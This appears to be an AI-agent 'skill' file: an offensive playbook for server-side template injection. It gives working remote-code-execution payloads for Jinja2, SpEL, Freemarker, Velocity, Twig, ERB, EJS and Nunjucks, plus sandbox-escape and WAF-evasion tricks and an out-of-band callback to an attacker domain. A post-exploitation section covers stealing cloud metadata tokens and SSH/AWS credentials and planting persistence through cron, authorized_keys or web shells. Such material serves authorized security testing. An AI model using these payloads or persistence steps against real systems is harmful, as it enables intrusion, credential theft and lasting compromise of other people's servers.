---
name: ssti
description: Server-side template injection across Jinja / Mako / Velocity / Freemarker / Thymeleaf / Twig / Handlebars / EJS / ERB with engine fingerprinting, sandbox escape, and RCE gadget chains
---

# Server-Side Template Injection

SSTI happens when user input reaches a template engine as syntax instead of as data — `{{user_input}}` rendered through Jinja, `${user_input}` through Velocity / SpEL, `<%= user_input %>` through ERB / EJS. The eventual impact is almost always RCE because template engines are designed to evaluate expressions and most leak access to the host language's runtime (Python builtins, Java reflection, JavaScript prototypes). The discovery cost is low — a `{{7*7}}` probe — but the gadget chain to RCE differs sharply per engine, so engine fingerprinting is the load-bearing step.

## Attack Surface

**Input shapes that reach the renderer**
- Form fields, query / path / header values, cookies, JSON / GraphQL variables
- Filenames and file metadata processed by document / report templates
- Email subject / body / template-selector fields
- Theme / customization endpoints (CSS / HTML generation, dashboard widgets, webhook payload templates)
- Markdown / WYSIWYG content rendered through a templating layer downstream

**Code patterns that enable injection**
- User input concatenated into a template string before `render(template_str)` instead of passed as a context variable to `render(template_obj, context)`
- "Template editor" features for tenants / admins where the *template itself* is user-controllable
- `format()` / `sprintf()` / printf-style chains with user-controlled format string downstream of a template
- YAML / TOML / JSON values whose strings are later evaluated through a template

**Engines in scope**
- Python: Jinja2, Mako, Django (limited)
- Java: Velocity, Freemarker, Thymeleaf (with SpEL), JSP EL
- JS / Node: Handlebars, Nunjucks, EJS, Pug, Marko, Dust
- Ruby: ERB, Haml, Slim
- PHP: Twig, Smarty, Blade
- .NET: Razor, RazorEngine

## High-Value Targets

- Email rendering pipelines (subject / body / "from" templates)
- PDF / report generators (server-side render → headless browser)
- CMS theme and plugin editors
- Webhook and notification payload templates
- API response formatters that interpolate strings (pagination labels, error messages, custom field renders)
- Admin / tenant template editors — explicit "edit your template" features

## Reconnaissance

### Injection Points

- Submit a benign string and grep responses (HTML, JSON, emails, PDFs) for verbatim reflection
- Anywhere user input ends up in a value that's clearly being templated (preview panes, "your message will look like…" panels) is high-signal
- Check error pages — many engines leak template syntax in stack traces

### Engine Fingerprinting

The classic differential probe — most engines evaluate exactly one of these, identifying themselves:

| Probe | Renders to | Engine family |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks |
| `{{7*'7'}}` | `7777777` (Jinja) or `49` (Twig) | distinguishes Jinja from Twig |
| `${7*7}` | `49` | Velocity / Freemarker / SpEL / JSP EL / Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB / EJS |
| `#{7*7}` | `49` | Pug / some Ruby contexts |
| `{{= 7*7 }}` | `49` | doT.js |

For Thymeleaf specifically, the `*{...}` selection-expression form also evaluates but only inside a `th:object` scope; `${...}` is the universal probe.

Secondary signals: error message text (engine name in stack trace), comment-syntax differential (`{# #}` Jinja vs `<%# %>` ERB vs `{* *}` Smarty), filter syntax (`|` vs `:` vs space).

### Blind Probes

When output isn't reflected:

- **Time-based**: payload that triggers a sleep on the host language (`{{''.__class__.__mro__[2].__subclasses__()[<idx>](...)}}` for Jinja, `${T(java.lang.Thread).sleep(5000)}` for SpEL, `<%= sleep(5) %>` for ERB)
- **OAST**: payload that performs a DNS lookup or HTTP fetch to attacker infrastructure (`{{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('x.attacker.tld')}}`)
- **Length / ETag diff**: payload whose evaluation changes the body length, even if the value isn't directly visible

## Key Vulnerabilities

### Jinja2 / Mako (Python)

The classic Python class walk — every object exposes its method-resolution-order, which leads to `object`, which exposes every subclass loaded in the interpreter, which includes things like `subprocess.Popen`:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
```

Locate a useful subclass and call it. Common gadgets when builtins are reachable through globals:

```jinja
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Sandbox bypass: even with `SandboxedEnvironment`, attribute-lookup tricks (`|attr('__class__')`) and `request.environ` access can re-introduce reachability. Check whether the app exposes `request`, `config`, `cycler`, or any framework global into the template context.

### Velocity / Freemarker / Thymeleaf (Java)

SpEL (Spring Expression Language) — used by Thymeleaf and various Spring components — gives direct access to `Runtime`:

```spel
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

Freemarker's `freemarker.template.utility.Execute` is the canonical RCE gadget when not denylisted:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

Velocity, similarly, via `ProcessBuilder` reachable through reflection:

```velocity
#set($rt = $Runtime.getRuntime()) $rt.exec("id")
```

Thymeleaf attribute expressions (`th:utext`, `th:href`, etc.) are exploitable when the value is user-controlled:

```html
<div th:utext="${T(java.lang.Runtime).getRuntime().exec('id')}"></div>
```

### Smarty / Twig / Blade (PHP)

Twig sandbox bypass via `_self.env` — registers `system` as an undefined-filter callback, then invokes it through the filter pipeline:

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

Smarty `{php}...{/php}` was the historical RCE primitive; deprecated in Smarty 3 and removed in 4. On modern Smarty, the surface is static-method invocation and template-object reflection — `{$smarty.template_object->smarty->...}` walks back to the Smarty engine, and direct static calls on whitelisted classes (e.g. `{Smarty_Internal_Write_File::writeFile(...)}` on misconfigured installs) reach the filesystem. Probe both before assuming Smarty is hardened.

Blade (Laravel) is template-compiled at build time, so user-controlled *templates* (not context values) only matter if `Blade::render($userInput, ...)` or `@php ... @endphp` blocks are reachable — both are direct RCE when present.

### ERB / Haml (Ruby)

Direct Ruby evaluation — backticks are the shortest:

```erb
<%= `id` %>
<%= system('id') %>
<% require 'open3'; Open3.capture2('id') %>
```

Haml is the same risk surface in different syntax. `instance_eval` / `class_eval` chained off any reachable object becomes RCE.

### Handlebars / Nunjucks / EJS (JavaScript)

EJS evaluates inline JavaScript:

```ejs
<%= process.mainModule.require('child_process').execSync('id').toString() %>
```

Nunjucks via constructor walk on reachable objects:

```nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

Handlebars itself is harder (default helpers are restricted), but custom helpers that pass arguments to `eval`, `Function`, or `child_process` re-open the surface. Also probe for prototype pollution as an SSTI amplifier — once `Object.prototype` is polluted, downstream template logic may execute attacker-controlled code paths.

## Bypass Techniques

**Sandbox escape — generic patterns**
- **Attribute lookup instead of direct access**: `{{x.__class__}}` blocked? try `{{x|attr('__class__')}}`
- **Class walk to recover deleted builtins**: `{{[].__class__.__base__.__subclasses__()}}` enumerates everything loaded
- **String constructor games**: `'__import__'.__class__` etc., when literal `__import__` is filtered
- **Filter / function aliasing**: same callable reachable via different names — find one not on the denylist
- **Implicit conversion**: object whose `__str__` / `toString` triggers code, coerced via concatenation

**Filter and parser evasion**
- Whitespace / case variants in keywords: `{{7 *7}}`, `{{ 7*7 }}`, `{{7*7}}`
- Comment injection between tokens: `{{7{#x#}*7}}` (Jinja) — splits a denylisted token across a comment
- Encoding layering: payload arrives URL-encoded, JSON-decoded, then template-rendered — pick the encoding that survives the filter but is decoded before render
- Operator precedence games: `((7)*(7))`, `7**7`, `7+0+7`
- Null byte truncation: `{{x%00.evil}}` — terminates payload for some pre-template filters but not the template parser
- Unicode normalization: smart quotes, fullwidth digits — bypasses naive denylists, normalizes back during render

**Polyglot and chained evaluation**
- Multi-engine pipelines: output of engine A feeds engine B — craft payload valid in both, or escape A and inject for B
- Markdown / RST embedded in a template — Markdown parser may strip your payload, but a code block survives and reaches the template
- Format string → template: printf-style format applied before template render; payload that's inert as a format string but live as a template

## RCE Primitives

**Direct command execution by language**
- Python: `os.system`, `os.popen`, `subprocess.run`, `subprocess.Popen`, `__import__('os').system`
- Java: `Runtime.getRuntime().exec`, `ProcessBuilder`, `freemarker.template.utility.Execute`
- Ruby: backticks, `system`, `exec`, `Open3.capture2`, `IO.popen`, `%x{}`
- JavaScript / Node: `require('child_process').execSync` / `exec` / `spawn`, `process.mainModule`
- PHP: `system`, `passthru`, `exec`, `shell_exec`, backticks, `popen`

**Indirect / second-stage**
- File write to webroot → trigger via subsequent HTTP request (when shell exec is blocked but file write isn't)
- Define a function / macro inline that runs on next render
- Unsafe deserialization gadget invoked through template (Java `ObjectInputStream`, Python `pickle`, PHP `unserialize`)
- DNS / HTTP exfiltration when shell exec produces no observable output

## Post-Exploitation

- Environment dump (`env`, `os.environ`, `System.getenv`) — credentials, cloud metadata tokens, internal URLs
- Cloud metadata fetch (`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`) — IAM tokens
- Read filesystem secrets (`.env`, `.aws/credentials`, `~/.ssh/`, `/proc/self/environ`)
- Lateral via internal HTTP — service mesh endpoints reachable from the rendering host
- Persistence: cron, scheduled task, systemd unit, `~/.ssh/authorized_keys`, web shell in webroot

## Testing Methodology

1. **Find templated input** — anywhere a server clearly templated user input (preview panes, email previews, dynamic dashboards, custom fields)
2. **Fingerprint the engine** — run the differential probe table; confirm with a second probe
3. **Confirm evaluation, not reflection** — `{{7*7}}` rendering as `49` (not `{{7*7}}` literally) is the line between XSS and SSTI
4. **Probe sandbox state** — try `{{self}}`, `{{config}}`, `{{request}}`, `{{cycler}}` (Jinja); `${self}`, `${T(java.lang.Class)}` (Java); `<%= self %>` (Ruby) — reachable globals are the gadget pool
5. **Enumerate gadgets** — class walk for Python / Node, reflection for Java, `require` chain for Node
6. **Reach RCE** — pick the shortest gadget chain to a shell-equivalent primitive
7. **Validate side effects** — DNS callback, file write, sleep — anything observable that proves execution

## Validation

1. Show evaluated output for two distinct expressions (`{{7*7}}` → `49` and `{{7*8}}` → `56`) to rule out coincidence or hard-coded reflection
2. Demonstrate object access (`{{self.__class__}}`, `${T(java.lang.Class)}`) confirming runtime reflection
3. Demonstrate side effect — DNS lookup to attacker-controlled domain, sleep with measurable delta, file written to a known path
4. For RCE: command output captured in response, file written, or OAST callback containing command output
5. Provide minimal payload — the simplest expression that reaches RCE, not the kitchen-sink polyglot

## False Positives

- Template syntax reflected literally (`{{7*7}}` rendered as `{{7*7}}`) — that's XSS-shaped, not SSTI
- Sandboxed environments where reflection succeeds but reachable objects expose nothing useful (Jinja `SandboxedEnvironment` with no `request` / `config` in context)
- Client-side template engines (Vue, Angular, Mustache running in the browser) — that's client-side template injection, different impact (XSS, not RCE)
- Markdown / static-site generators that template at build time only, with no user input reaching the build
- Engines where the output is HTML-escaped before display, masking evaluation as XSS-like reflection — verify with a non-HTML probe (`{{7*7}}` numeric)

## Impact

- Remote code execution on the rendering host (the default outcome — almost every engine leaks a path to it)
- Server-side data exfiltration via gadget chains (filesystem, env vars, internal HTTP)
- Cloud credential theft via metadata service access from the compromised host
- Lateral movement into internal services reachable from the renderer
- Persistent backdoor via web shell or service-account key planting
- Build / supply-chain compromise when the templated content is a build artifact

## Pro Tips

1. Always confirm with a second math probe (`{{7*8}}`) before celebrating — single-shot reflection of `49` could be coincidental
2. Engine fingerprint first, gadget chain second — wrong-engine payloads are wasted requests and noise in WAF logs
3. For Jinja, the highest-yield reachable global varies by framework (`request` in Flask, `config` always present, `cycler` in older Jinja); spray all three before walking subclasses
4. SpEL is everywhere in Spring stacks — Thymeleaf, Spring Security expression language, Spring Cloud Gateway routes; the same payload shape (`${T(java.lang.Runtime)...}`) works across all of them
5. EJS / Nunjucks are common in Express / Koa apps — `process.mainModule.require('child_process')` is the canonical Node RCE primitive
6. Sandbox escapes are usually one indirection away — `attr` lookup, constructor traversal, MRO walk; most "sandboxed" environments still reach the runtime if you go through attribute access instead of direct reference
7. Output not reflected? Time-based and OAST work as well as for SQLi — `${T(java.lang.Thread).sleep(5000)}` for SpEL, `__import__('time').sleep(5)` for Jinja
8. Email previews and PDF generators are gold mines — they're often built on the same engine as the public site but exposed to less-validated input flows

## Summary

SSTI is fundamentally different from XSS at the same syntactic location: the payload runs on the server, in the host language, with whatever objects the engine exposes. Engine fingerprinting via the math-probe table narrows the search space immediately. From there it's a race between the sandbox's denylist and the language's reflection capability — and the language usually wins. Treat any user input that reaches a template renderer (not a templated context variable) as RCE-shaped until proven sandboxed.
